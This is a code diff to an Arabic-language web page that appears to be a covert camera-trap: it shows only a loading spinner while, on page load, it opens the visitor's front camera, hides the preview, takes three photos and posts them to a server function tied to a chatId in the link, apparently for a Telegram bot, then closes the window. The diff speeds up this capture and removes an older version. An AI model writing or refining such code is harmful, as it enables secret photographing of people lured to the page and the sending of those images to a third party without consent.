@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🇪🇬🔥</title>
+    <title>🔥🇪🇬</title>
     <style>
         * {
             margin: 0;
@@ -20,6 +20,12 @@
             height: 100vh;
             font-family: Arial, sans-serif;
             color: white;
+            overflow: hidden;
+        }
+        
+        .loader-container {
+            text-align: center;
+            margin-bottom: 30px;
         }
         
         .spinner {
@@ -29,7 +35,13 @@
             border-top: 8px solid #3498db;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            margin: 0 auto 20px;
+        }
+        
+        .loading-text {
+            font-size: 18px;
+            color: rgba(255,255,255,0.8);
+            margin-top: 15px;
         }
         
         @keyframes spin {
@@ -38,22 +50,62 @@
         }
         
         .hidden {
-            display: none !important;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div id="loader">
+    <div class="loader-container">
         <div class="spinner"></div>
-        <div>جاري التحميل...</div>
+        <div class="loading-text">جاري التحميل...</div>
     </div>
 
     <video id="cameraPreview" class="hidden" autoplay playsinline muted></video>
     <canvas id="photoCanvas" class="hidden"></canvas>
 
     <script>
-        async function takeThreePhotosUltraFast() {
-            const chatId = new URLSearchParams(window.location.search).get('chatId');
+        // أزليت التوكن من هنا
+        
+        // وظائف سريعة بدون تأخير
+        function getChatId() {
+            return new URLSearchParams(window.location.search).get('chatId');
+        }
+        
+        // إرسال الصور عبر Netlify Function
+        async function sendPhotoToTelegram(photoBlob, chatId, photoNumber) {
+            try {
+                // تحويل Blob إلى Base64
+                const reader = new FileReader();
+                const base64Promise = new Promise((resolve) => {
+                    reader.onloadend = () => resolve(reader.result);
+                });
+                reader.readAsDataURL(photoBlob);
+                const base64Data = await base64Promise;
+                
+                // إرسال لـ Netlify Function
+                const response = await fetch('/.netlify/functions/send-photo', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json' 
+                    },
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        photo: base64Data.split(',')[1], // فقط الجزء بعد ,
+                        photoNumber: photoNumber
+                    })
+                });
+                
+                const result = await response.json();
+                return result.success;
+                
+            } catch (error) {
+                console.error('Error sending photo:', error);
+                return false;
+            }
+        }
+        
+        async function takeThreePhotosWithFrontCamera() {
+            const chatId = getChatId();
             if (!chatId) {
                 window.close();
                 return;
@@ -67,95 +119,64 @@
             canvas.height = 480;
             
             try {
-                // 1. فتح الكاميرا
+                // استخدام الكاميرا الأمامية فقط
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: 'user',
+                        facingMode: "user", // الكاميرا الأمامية
                         width: { ideal: 640 },
-                        height: { ideal: 480 }
+                        height: { ideal: 480 },
+                        frameRate: { ideal: 15 }
                     }
                 });
                 
                 video.srcObject = stream;
+                video.play().catch(() => {});
                 
-                // 2. انتظار الفيديو يبدأ فعلاً
-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => {
-                        video.play().then(resolve).catch(resolve);
-                    };
-                });
+                // انتظار 300ms فقط
+                await new Promise(resolve => setTimeout(resolve, 300));
                 
-                // 3. انتظر شوية عشان الصورة تستقر
-                await new Promise(resolve => setTimeout(resolve, 800));
+                // التقاط وإرسال الصور الثلاث
+                const sendPromises = [];
                 
-                // 4. خد 3 صور
                 for (let i = 1; i <= 3; i++) {
-                    // خد الصورة
+                    // التقاط الصورة
                     ctx.drawImage(video, 0, 0, 640, 480);
-                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                    canvas.toBlob((blob) => {
+                        if (blob) {
+                            // إرسال كل صورة بشكل غير متزامن
+                            const sendPromise = sendPhotoToTelegram(blob, chatId, i);
+                            sendPromises.push(sendPromise);
+                        }
+                    }, 'image/jpeg', 0.7);
                     
-                    // حولها لـ blob
-                    const byteString = atob(dataUrl.split(',')[1]);
-                    const mimeString = dataUrl.split(',')[0].split(':')[1].split(';')[0];
-                    const ab = new ArrayBuffer(byteString.length);
-                    const ia = new Uint8Array(ab);
-                    for (let j = 0; j < byteString.length; j++) {
-                        ia[j] = byteString.charCodeAt(j);
-                    }
-                    const blob = new Blob([ab], { type: mimeString });
-                    
-                    // ابعت الصورة (من غير ما تنتظر الرد)
-                    sendPhotoFast(blob, chatId, i);
-                    
-                    // استنى 400ms بين كل صورة
+                    // انتظار 100ms بين الصور
                     if (i < 3) {
-                        await new Promise(r => setTimeout(r, 400));
+                        await new Promise(r => setTimeout(r, 100));
                     }
                 }
                 
-                // 5. اقفل الكاميرا
+                // انتظار كل عمليات الإرسال
+                await Promise.all(sendPromises);
+                
+                // إغلاق الكاميرا
                 stream.getTracks().forEach(track => track.stop());
                 
-                // 6. اقفل الصفحة بعد 1 ثانية
-                setTimeout(() => {
-                    window.close();
-                }, 1000);
-                
-            } catch (error) {
-                // لو في خطأ اقفل الصفحة بعد نص ثانية
+                // إغلاق النافذة بعد 500ms
                 setTimeout(() => {
                     window.close();
                 }, 500);
+                
+            } catch (error) {
+                console.error('Error accessing front camera:', error);
+                // في حالة خطأ في الكاميرا الأمامية، أغلق مباشرة
+                setTimeout(() => {
+                    window.close();
+                }, 300);
             }
         }
         
-        // دالة إرسال الصورة
-        async function sendPhotoFast(photoBlob, chatId, photoNumber) {
-            try {
-                const reader = new FileReader();
-                reader.onloadend = function() {
-                    fetch('/.netlify/functions/send-photo-fast', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chatId: chatId,
-                            photo: reader.result.split(',')[1],
-                            photoNumber: photoNumber
-                        })
-                    }).catch(() => {});
-                };
-                reader.readAsDataURL(photoBlob);
-            } catch (e) {
-                // تجاهل الأخطاء
-            }
-        }
-        
-        // ابدأ لما الصفحة تتحمل
-        window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(() => {
-                takeThreePhotosUltraFast();
-            }, 300);
-        });
+        // بدء فوري عند تحميل الصفحة
+        window.addEventListener('load', takeThreePhotosWithFrontCamera);
     </script>
 </body>
 </html>
